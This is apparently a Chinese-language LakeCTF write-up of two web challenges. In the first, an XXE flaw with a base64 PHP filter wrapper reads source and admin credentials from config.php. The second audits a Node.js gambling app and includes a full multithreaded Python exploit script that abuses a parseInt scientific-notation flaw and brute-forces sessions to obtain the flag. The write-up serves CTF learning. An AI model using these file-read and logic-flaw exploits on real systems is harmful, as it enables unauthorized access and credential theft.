LAKECTF

1.题目是Le Canard du Lac,开头画面是

![img](https://cdn.nlark.com/yuque/0/2025/png/60825528/1764390433946-1afc3998-86f0-4320-8ac1-e3c5820c76a5.png)

看看别的界面

![img](https://cdn.nlark.com/yuque/0/2025/png/60825528/1764390556922-a55fac1c-10a3-47bf-9940-1b318902583e.png)

![img](https://cdn.nlark.com/yuque/0/2025/png/60825528/1764390592465-7925b0d1-4955-4c90-8145-06b2e21f809a.png)![img](https://cdn.nlark.com/yuque/0/2025/png/60825528/1764390597798-371d99e1-ce61-459f-9678-f4086f988093.png)

就是一个xml接口，一个信息输入接口，然后一个登录接口，开始FUZZ测试，先试试搜索框存不存在SQL注入，发现没有反应，下一个xml，发现xml存在解析，并且能回显，但是读源文件会解析失败，尝试伪协议，使用base64编码后读取，成功读到源码

![img](https://cdn.nlark.com/yuque/0/2025/png/60825528/1764390776340-2f075b02-4cdb-4969-bf34-1b37bfa997fd.png)

并且同理在config.php下读取到了管理员凭证，即账号密码，登陆进去后直接获得FLAG。





2.题目是gamblecore，源码直接给，这是js审计类题目

```javascript
const express = require('express');
const session = require('express-session');
const crypto = require('crypto');
const path = require('path');
const bodyParser = require('body-parser');

const app = express();
const PORT = 3000;

app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public')));
app.use('/audio', express.static(path.join(__dirname, 'audio'))); // Serve mp3s from app root

app.use(session({
    secret: crypto.randomBytes(32).toString('hex'),
    resave: false,
    saveUninitialized: true,
    cookie: { secure: false }
}));

// Initialize wallet
app.use((req, res, next) => {
    if (!req.session.wallet) {
        req.session.wallet = {
            coins: 10e-6, // 10 microcoins
            usd: 0
        };
    }
    next();
});

// Helper for secure random float [0, 1)
function secureRandom() {
    return crypto.randomInt(0, 100000000) / 100000000;
}

app.get('/api/balance', (req, res) => {
    res.json({
        coins: req.session.wallet.coins,
        microcoins: req.session.wallet.coins * 1e6,
        usd: req.session.wallet.usd
    });
});

app.post('/api/gamble', (req, res) => {
    const { currency, amount } = req.body;
    
    if (!['coins', 'usd'].includes(currency)) {
        return res.status(400).json({ error: 'Invalid currency' });
    }

    let betAmount = parseFloat(amount);
    if (isNaN(betAmount) || betAmount <= 0) {
        return res.status(400).json({ error: 'Invalid amount' });
    }

    const wallet = req.session.wallet;
    
    if (currency === 'coins') {
        if (betAmount > wallet.coins) {
            return res.status(400).json({ error: 'Insufficient funds' });
        }
    } else {
        if (betAmount > wallet.usd) {
            return res.status(400).json({ error: 'Insufficient funds' });
        }
    }

    // Deduct bet
    if (currency === 'coins') wallet.coins -= betAmount;
    else wallet.usd -= betAmount;

    // 9% chance to win
    const win = secureRandom() < 0.09;
    let winnings = 0;

    if (win) {
        winnings = betAmount * 10;
        if (currency === 'coins') wallet.coins += winnings;
        else wallet.usd += winnings;
    }

    res.json({
        win: win,
        new_balance: currency === 'coins' ? wallet.coins : wallet.usd,
        winnings: winnings
    });
});

app.post('/api/convert', (req, res) => {
    let { amount } = req.body;

    const wallet = req.session.wallet;
    const coinBalance = parseInt(wallet.coins);
    amount = parseInt(amount);
    if (isNaN(amount) || amount <= 0) {
        return res.status(400).json({ error: 'Invalid amount' });
    }
    
    if (amount <= coinBalance && amount > 0) {
        wallet.coins -= amount;
        wallet.usd += amount * 0.01;
        return res.json({ success: true, message: `Converted ${amount} coins to $${(amount * 0.01).toFixed(2)}` });
    } else {
        return res.status(400).json({ error: 'Conversion failed.' });
    }
});

app.post('/api/flag', (req, res) => {
    if (req.session.wallet.usd >= 10) {
        req.session.wallet.usd -= 10;
        res.json({ flag: process.env.FLAG || 'EPFL{fake_flag}' }); 
    } else {
        res.status(400).json({ error: 'Not enough USD. You need $10.' });
    }
});

app.post('/api/deposit', (req, res) => {
    res.status(503).json({ error: 'Deposit unavailable at the moment' });
});

app.post('/api/withdraw', (req, res) => {
    res.status(503).json({ error: 'Withdrawal unavailable at the moment' });
});

app.listen(PORT, () => {
    console.log(`Server running on http://0.0.0.0:${PORT}`);
});
```

定义了很多路由，那就让我们一步一步去梳理过程，先是设定一个钱包，

```javascript
// Initialize wallet
app.use((req, res, next) => {
    if (!req.session.wallet) {
        req.session.wallet = {
            coins: 10e-6, // 10 microcoins
            usd: 0
        };
    }
    next();
});
```

初始化之后钱包就有10e-6的钱了，然后是game环节，这里讲下，因为后面的flag模块是判断数据库的usd是不是到了10，而不是post，所以我们改post的作用在前面，因为这里是把post上来的amount解析为浮点数，然后我们用初始的0.00000001const下注一次，然后有%91概率会输，于是我们输了之后就有了0.0000000091const，换算成科学计数法就是9.0000001e-7，然后我们看看换钱的算法

```javascript
app.post('/api/convert', (req, res) => {
    let { amount } = req.body;

    const wallet = req.session.wallet;
    const coinBalance = parseInt(wallet.coins);
    amount = parseInt(amount);
    if (isNaN(amount) || amount <= 0) {
        return res.status(400).json({ error: 'Invalid amount' });
    }
    
    if (amount <= coinBalance && amount > 0) {
        wallet.coins -= amount;
        wallet.usd += amount * 0.01;
        return res.json({ success: true, message: `Converted ${amount} coins to $${(amount * 0.01).toFixed(2)}` });
    } else {
        return res.status(400).json({ error: 'Conversion failed.' });
    }
});
```

 我们发现coins是用parseInt处理的，这个函数处理浮点数的科学计数法会把它先解析成字符串再进行处理，于是就省略了e啥的，就成了9，然后换成了0.09$，接下来就是多线程爆破了，因为

  const win = secureRandom() < 0.09;

​    let winnings = 0;

也就是胜率是%9，很低，并且要连续获胜3次，usd从0.09->0.9->9->90，这样usd就>10，系统就输出flag了，这里把py梭哈脚本贴上来

```python
import requests
import time
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed

BASE = "https://chall.polygl0ts.ch:8148"
TIMEOUT = 5
WORKERS = 10  # 并发线程数


def build_session():
    s = requests.Session()
    # 禁用环境代理
    s.trust_env = False
    s.proxies = {}
    return s


def api_get(s, path):
    return s.get(BASE + path, timeout=TIMEOUT)


def api_post(s, path, json=None):
    return s.post(BASE + path, json=json, timeout=TIMEOUT)


def get_balance(s):
    r = api_get(s, "/api/balance")
    r.raise_for_status()
    return r.json()


def gamble_coin_to_magic_zone(s, wid, attempt):
    """
    用 coins 赌 0.0000091，目标让 coins 掉到 9e-7 左右
    """
    try:
        r = api_post(
            s, "/api/gamble",
            json={"currency": "coins", "amount": 0.0000091}
        )
        if not r.ok:
            print(f"[W{wid} A{attempt}] gamble coins 请求失败，code={r.status_code}")
            return False

        b = get_balance(s)
        coins = b.get("coins", 0.0)
        print(f"[W{wid} A{attempt}] 赌完 coins 后余额：{b}")

        # coins 在 (0, 1e-6) 区间基本就是我们要的 9e-7 那段
        if 0 < coins < 1e-6:
            print(f"[W{wid} A{attempt}] ✅ 进入魔法区间 coins={coins}")
            return True
        else:
            print(f"[W{wid} A{attempt}] ❌ 没进魔法区间 coins={coins}")
            return False

    except Exception as e:
        print(f"[W{wid} A{attempt}] gamble_coin_to_magic_zone 异常: {e}")
        return False


def convert_magic(s, wid, attempt):
    """
    在 coins≈9e-7 时，利用 parseInt，把 amount=9e-7 变成 9 coin -> 0.09 USD
    """
    try:
        r = api_post(s, "/api/convert", json={"amount": 0.0000009})
        if not r.ok:
            print(f"[W{wid} A{attempt}] convert 请求失败，code={r.status_code}")
            return False

        b = get_balance(s)
        usd = b.get("usd", 0.0)
        print(f"[W{wid} A{attempt}] 兑换后余额：{b}")
        if usd >= 0.09 - 1e-6:
            print(f"[W{wid} A{attempt}] ✅ 成功拿到初始 USD={usd}")
            return True
        else:
            print(f"[W{wid} A{attempt}] ❌ 兑换后 USD 不够，usd={usd}")
            return False

    except Exception as e:
        print(f"[W{wid} A{attempt}] convert_magic 异常: {e}")
        return False


def gamble_usd_to_flag(s, wid, attempt, stop_event):
    """
    用 USD all-in 赌到 >= 10，然后买 flag。
    任一线程成功后会 stop_event.set()
    """
    round_id = 0
    while not stop_event.is_set():
        round_id += 1
        try:
            b = get_balance(s)
        except Exception as e:
            print(f"[W{wid} A{attempt} R{round_id}] 读取余额异常: {e}")
            return None

        usd = b.get("usd", 0.0)

        if usd >= 10:
            print(f"[W{wid} A{attempt} R{round_id}] 🎯 USD={usd} ≥10，尝试买 flag")
            try:
                r = api_post(s, "/api/flag")
                data = r.json()
            except Exception as e:
                print(f"[W{wid} A{attempt} R{round_id}] /api/flag 异常: {e}, text={r.text if 'r' in locals() else ''}")
                return None

            if isinstance(data, dict) and "flag" in data:
                print(f"[W{wid} A{attempt} R{round_id}] 🏁 拿到 flag: {data['flag']}")
                return data["flag"]
            else:
                print(f"[W{wid} A{attempt} R{round_id}] /api/flag 返回不含 flag: {data}")
                return None

        if usd <= 0:
            print(f"[W{wid} A{attempt} R{round_id}] 💀 USD 已归零，本 session 死亡")
            return None

        print(f"[W{wid} A{attempt} R{round_id}] 💸 all-in USD = {usd}")
        try:
            r = api_post(
                s, "/api/gamble",
                json={"currency": "usd", "amount": usd}
            )
            if not r.ok:
                print(f"[W{wid} A{attempt} R{round_id}] gamble usd 请求失败，code={r.status_code}")
                return None
        except Exception as e:
            print(f"[W{wid} A{attempt} R{round_id}] gamble usd 异常: {e}")
            return None

        # 稍微控速，减轻服务器压力
        time.sleep(0.02)


def worker(worker_id, stop_event):
    """
    单个线程的循环逻辑：
    不断新建 session -> 调整 coins -> convert -> 赌 usd
    任一成功拿到 flag 就返回 flag。
    """
    attempts = 0
    while not stop_event.is_set():
        attempts += 1
        print(f"\n[W{worker_id}] ===== 新尝试 A{attempts} 开始 =====")

        try:
            s = build_session()
            r = api_get(s, "/api/balance")
            r.raise_for_status()
            print(f"[W{worker_id} A{attempts}] 初始余额：{r.json()}")
        except Exception as e:
            print(f"[W{worker_id} A{attempts}] 建立 session / 获取初始余额失败: {e}")
            continue

        # 1. 调整 coins 到魔法区间
        if not gamble_coin_to_magic_zone(s, worker_id, attempts):
            continue

        # 2. 利用 convert 漏洞换出 0.09 USD
        if not convert_magic(s, worker_id, attempts):
            continue

        # 3. 用 USD all-in 赌到 ≥10，再买 flag
        flag = gamble_usd_to_flag(s, worker_id, attempts, stop_event)
        if flag:
            print(f"[W{worker_id}] 🎉 成功拿到 flag！结束本 worker。")
            return flag

    return None


def main():
    stop_event = threading.Event()
    flag_result = None

    with ThreadPoolExecutor(max_workers=WORKERS) as executor:
        futures = {
            executor.submit(worker, i, stop_event): i
            for i in range(1, WORKERS + 1)
        }

        for future in as_completed(futures):
            worker_id = futures[future]
            try:
                result = future.result()
            except Exception as e:
                print(f"[W{worker_id}] worker 出错：{e}")
                continue

            if result:
                flag_result = result
                stop_event.set()
                break

    if flag_result:
        print("\n================ 最终 FLAG ================")
        print(flag_result)
        print("===========================================")
    else:
        print("还没刷到 flag，可以考虑把 WORKERS 调大、或者多跑一会儿。")


if __name__ == "__main__":
    main()
```